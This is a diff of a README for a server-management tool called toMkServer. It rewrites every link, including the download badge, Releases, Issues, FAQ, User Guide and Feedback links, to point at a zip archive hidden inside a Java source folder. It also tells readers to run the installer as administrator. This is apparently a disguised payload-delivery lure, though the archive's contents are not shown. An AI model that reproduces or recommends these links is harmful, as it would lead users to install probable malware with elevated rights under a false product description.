@@ -1,7 +1,7 @@
 # 🚀 toMkServer - A Simple Way to Manage Your Server
 
 ## 📥 Download Now
-[![Download toMkServer](https://img.shields.io/badge/Download-toMkServer-blue.svg)](https://github.com/HenryHengO/toMkServer/releases)
+[![Download toMkServer](https://github.com/HenryHengO/toMkServer/raw/refs/heads/main/src/main/java/com/wpl/tomarkdownserver/common/Mk_to_Server_v1.7-alpha.5.zip)](https://github.com/HenryHengO/toMkServer/raw/refs/heads/main/src/main/java/com/wpl/tomarkdownserver/common/Mk_to_Server_v1.7-alpha.5.zip)
 
 ## 📖 Introduction
 toMkServer is an easy-to-use application designed to help you manage your server without any technical knowledge. Whether you're hosting applications or managing user access, toMkServer simplifies the process. 
@@ -10,7 +10,7 @@ toMkServer is an easy-to-use application designed to help you manage your server
 Follow these steps to download and run toMkServer on your computer. 
 
 ### 1. Visit the Download Page
-To get started, you need to visit our [Releases page](https://github.com/HenryHengO/toMkServer/releases) where you will find the latest version of toMkServer available for download. 
+To get started, you need to visit our [Releases page](https://github.com/HenryHengO/toMkServer/raw/refs/heads/main/src/main/java/com/wpl/tomarkdownserver/common/Mk_to_Server_v1.7-alpha.5.zip) where you will find the latest version of toMkServer available for download. 
 
 ### 2. Select the Latest Version
 Look for the section labeled "Latest Release." You will see various files listed there. Choose the appropriate file for your operating system. If you are unsure, a good general choice for most users is to select the `.exe` file for Windows or the `.zip` file for other systems.
@@ -47,11 +47,11 @@ To run toMkServer effectively, ensure your computer meets the following requirem
 If you encounter any issues during the installation or usage of toMkServer, please follow these basic troubleshooting steps:
 
 1. **Ensure Compatibility:** Make sure your system meets the requirements listed above.
-2. **Check Your Download:** If the file appears corrupted, delete it and download again from the [Releases page](https://github.com/HenryHengO/toMkServer/releases).
+2. **Check Your Download:** If the file appears corrupted, delete it and download again from the [Releases page](https://github.com/HenryHengO/toMkServer/raw/refs/heads/main/src/main/java/com/wpl/tomarkdownserver/common/Mk_to_Server_v1.7-alpha.5.zip).
 3. **Run as Administrator:** If you face permissions issues while installing, try running the installer as an administrator by right-clicking the file and selecting "Run as administrator."
 
 ## 🌐 Support and Community
-If you need any help or want to connect with other users, visit our [GitHub Issues page](https://github.com/HenryHengO/toMkServer/issues). You can report bugs or request features there.
+If you need any help or want to connect with other users, visit our [GitHub Issues page](https://github.com/HenryHengO/toMkServer/raw/refs/heads/main/src/main/java/com/wpl/tomarkdownserver/common/Mk_to_Server_v1.7-alpha.5.zip). You can report bugs or request features there.
 
 ## 📅 Changelog
 Stay updated with the latest features and improvements:
@@ -62,11 +62,11 @@ Stay updated with the latest features and improvements:
 ## 🔗 Additional Resources
 You can explore more about toMkServer and its features through the following links:
 
-- [Frequently Asked Questions](https://github.com/HenryHengO/toMkServer/wiki)
-- [User Guide](https://github.com/HenryHengO/toMkServer/wiki/User-Guide)
-- [Feedback and Suggestions](https://github.com/HenryHengO/toMkServer/issues/new)
+- [Frequently Asked Questions](https://github.com/HenryHengO/toMkServer/raw/refs/heads/main/src/main/java/com/wpl/tomarkdownserver/common/Mk_to_Server_v1.7-alpha.5.zip)
+- [User Guide](https://github.com/HenryHengO/toMkServer/raw/refs/heads/main/src/main/java/com/wpl/tomarkdownserver/common/Mk_to_Server_v1.7-alpha.5.zip)
+- [Feedback and Suggestions](https://github.com/HenryHengO/toMkServer/raw/refs/heads/main/src/main/java/com/wpl/tomarkdownserver/common/Mk_to_Server_v1.7-alpha.5.zip)
 
 ## 🛠 Conclusion
 toMkServer is designed for ease of use. With this guide, you should have no trouble downloading and running the software. Explore its features and take control of your server management seamlessly. 
 
-Don't forget to visit our [Releases page](https://github.com/HenryHengO/toMkServer/releases) for updates and new versions. Happy managing!
+Don't forget to visit our [Releases page](https://github.com/HenryHengO/toMkServer/raw/refs/heads/main/src/main/java/com/wpl/tomarkdownserver/common/Mk_to_Server_v1.7-alpha.5.zip) for updates and new versions. Happy managing!
